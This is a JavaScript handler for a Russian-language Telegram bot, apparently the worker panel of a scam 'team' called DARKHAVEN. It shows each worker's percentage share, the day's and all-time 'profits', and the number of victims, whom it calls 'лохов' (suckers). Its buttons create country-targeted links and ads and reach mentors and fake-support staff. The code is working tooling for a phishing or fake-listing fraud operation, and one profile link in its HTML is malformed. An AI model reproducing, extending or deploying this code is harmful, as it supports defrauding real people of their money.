const { Markup } = require("telegraf");
const { Op } = require("sequelize");
const moment = require("moment");
const {
  items,
  Profits,
  settings,
  Logs,
} = require("../../../database/index");

module.exports = async (ctx) => {
  try {
    if (ctx.state.req == true || ctx.state.user.status == 0) {
      return ctx.replyWithHTML(
        `💁🏻‍♂️ <b>Привет,</b> ${ctx.from.first_name}<b>!</b>
🦋 <b>Перед тем, как продолжить использование бота тебе надо подать заявку!</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("🔹 Подать заявку! 🔹", "sendRequest")],
          ]),
        }
      );
    }

    await ctx.deleteMessage().catch((err) => err);

    try {
      // Получаем настройки проекта
      const Settings = await settings.findOne({ where: { id: 1 } });
      
      // Статистика профитов за день
      const todayStart = moment().startOf('day').toDate();
      const dayProfits = await Profits.count({
        where: {
          workerId: ctx.from.id,
          createdAt: { [Op.gte]: todayStart }
        }
      });

      const daySum = await Profits.sum('eurAmount', {
        where: {
          workerId: ctx.from.id,
          createdAt: { [Op.gte]: todayStart }
        }
      }) || 0;

      // Общая статистика профитов
      const totalProfits = await Profits.count({
        where: { workerId: ctx.from.id }
      });

      const totalSum = await Profits.sum('eurAmount', {
        where: { workerId: ctx.from.id }
      }) || 0;

      // Количество активных ссылок
      const activeLinks = await items.count({
        where: { workerId: ctx.from.id }
      });

      // Дни в команде
      const createdAt = ctx.state.user.createdAt || new Date();
      const daysInTeam = Math.ceil((new Date() - new Date(createdAt)) / (1000 * 60 * 60 * 24));

      return ctx
        .replyWithHTML(
          `🦅 <b>href="https://t.me/https://t.me/${ctx.state.user.username || ctx.from.username}">DARKHAVEN ПРОФИЛЬ</a></b>

👤 <b>Позывной:</b> #${ctx.state.user.tag}
⚖️ <b>Твоя доля:</b> ${ctx.state.user.percent || Settings.percent}%

🪶 <b>Собрано дани за сегодня:</b>
• Количество лохов: <b>${dayProfits}</b>
• На сумму: <b>$${daySum.toFixed(2)}</b>

🦅 <b>Заработано за все время:</b>
• Количество лохов: <b>${totalProfits}</b>
• На сумму: <b>$${totalSum.toFixed(2)}</b>

🚦 <b>Статус проекта:</b> ${Settings.work ? '🟢 WORK' : '🔴 STOP'}
🔗 <b>Активных ссылок:</b> ${activeLinks}
⏱️ <b>В команде:</b> ${daysInTeam} дней`,
          {
            reply_markup: Markup.inlineKeyboard([
              // Первый ряд - основные действия (создание контента)
              [
                Markup.callbackButton("🌏 Страны", "createLink"),
              ],
              
              // Второй ряд - контент и результаты
              [
                Markup.callbackButton("📄 Объявления", "myAds"),
                Markup.callbackButton("💰 Профиты", "myProfits")
              ],
              
              // Третий ряд - люди и помощь
              [
                Markup.callbackButton("👩‍🏫 Наставники", "mentors"),
                Markup.callbackButton("🏆 ТПшеры", "tpManagers")
              ],
              
              // Четвертый ряд - информация и настройки
              [
                Markup.callbackButton("ℹ️ Информация", "projectInfo"),
                Markup.callbackButton("⚙️ Настройки", "settings")
              ],
              
              // Пятый ряд - профиль (по центру, как важная кнопка)
              [Markup.callbackButton("💁🏼‍♂️ Мой профиль", "profile")],
              
              // Шестой ряд - жалобы и предложения (менее приоритетные)
              [Markup.callbackButton("⚠️ Жалобы и предложения", "report")],
              
              // Админ-панель (если админ)
              ...(ctx.state.user.admin == true
                ? [[Markup.callbackButton("💻 Админ-панель", "admin")]]
                : []),
            ]),
          }
        )
        .catch((err) => err);

    } catch (statsError) {
      console.log('Ошибка загрузки статистики:', statsError);
      
      // Fallback меню без статистики
      return ctx
        .replyWithHTML(
          `🦅 <b> DARKHAVEN ПРОФИЛЬ</b>

👤 <b>Позывной:</b> #${ctx.state.user.tag}
⚖️ <b>Твоя доля:</b> ${ctx.state.user.percent || 60}%

❌ <b>Ошибка загрузки статистики</b>

🚦 <b>Статус проекта:</b> Неизвестно
🔗 <b>Активных ссылок:</b> Неизвестно
⏱️ <b>В команде:</b> Неизвестно`,
          {
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton("🌏 Страны", "createLink")              ],
              [
                Markup.callbackButton("📄 Объявления", "myAds"),
                Markup.callbackButton("💰 Профиты", "myProfits")
              ],
              [
                Markup.callbackButton("👩‍🏫 Наставники", "mentors"),
                Markup.callbackButton("🏆 ТПшеры", "tpManagers")
              ],
              [
                Markup.callbackButton("ℹ️ Информация", "projectInfo"),
                Markup.callbackButton("⚙️ Настройки", "settings")
              ],
              [Markup.callbackButton("💁🏼‍♂️ Мой профиль", "profile")],
              [Markup.callbackButton("⚠️ Жалобы и предложения", "report")],
              ...(ctx.state.user.admin == true
                ? [[Markup.callbackButton("💻 Админ-панель", "admin")]]
                : []),
            ]),
          }
        )
        .catch((err) => err);
    }
  } catch (err) {
    console.log('Критическая ошибка в start.js:', err);
    return ctx.replyWithHTML("❌ Произошла ошибка. Попробуйте позже.");
  }
};